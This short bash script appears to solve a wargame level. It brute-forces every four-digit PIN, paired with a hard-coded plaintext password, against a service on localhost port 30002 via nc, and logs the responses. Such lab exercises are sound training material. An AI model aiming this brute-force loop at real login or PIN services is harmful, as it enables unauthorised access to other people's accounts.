#!/bin/bash
passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for a in {0..9}{0..9}{0..9}{0..9}
do
   str=`echo $passwd' '$a`
   echo $str

done | nc localhost 30002 >> result.txt

